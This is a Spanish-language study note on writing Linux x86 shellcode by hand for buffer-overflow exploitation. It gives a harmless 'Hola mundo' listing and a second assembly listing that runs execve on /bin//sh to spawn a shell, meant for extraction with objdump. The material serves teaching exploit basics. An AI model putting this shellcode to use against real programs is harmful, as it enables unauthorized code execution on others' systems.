Los **shellcodes** son programas pequeños y altamente optimizados que se utilizan para explotar vulnerabilidades de seguridad y ejecutar código malicioso en una máquina objetivo. Los shellcodes suelen ser escritos en lenguaje **ensamblador** para garantizar una ejecución rápida y eficiente.

Exploraremos cómo funcionan los shellcodes por detrás mediante la creación de algunos shellcodes manualmente. Por ejemplo, intentaremos crear un shellcode que muestre por consola el mensaje “**Hola mundo**” utilizando interrupciones del sistema. Asimismo, intentaremos aplicar una llamada a nivel de sistema para lograr ejecutar un comando deseado.

Una vez que se ha generado el compilado resultante, se puede utilizar el comando **objdump** para convertir el archivo binario generado en un shellcode que pueda ser utilizado en un Buffer Overflow.

```shell
 section .text
   2   │   global _start
   3   │ 
   4   │ _start:
   5   │   
   6   │   mov eax, 4
   7   │ 
   8   │   mov ebx, 1
   9   │   push 0x0a6f64
  10   │   push 0x6e756d20
  11   │   push 0x616c6f48
  12   │   mov ecx, esp
  13   │   mov edx, 11
  14   │   int 80h
  15   │ 
  16   │   mov eax, 1
  17   │   xor ebx, ebx
  18   │ 
  19   │   int 80h
```


![[Screenshot (36).png]]


![[Screenshot (38).png]]![[Screenshot (39).png]]![[Screenshot (41).png]]

 Buffer Overflow. 
```bash
  1   │ section .text
   2   │   global _start
   3   │ 
   4   │ _start:
   5   │   
   6   │   mov eax, 11
   7   │   push 0x0 ; Terminacion de la cadena
   8   │   push 0x68732f2f ; "//sh"
   9   │   push 0x6e69622f ; "/bin"
  10   │ 
  11   │   mov ebx, esp
  12   │   xor ecx, ecx
  13   │   xor edx, edx
  14   │   int 80h ; Interrupcion
  15   │ 
───────┴────────────────────────────
```
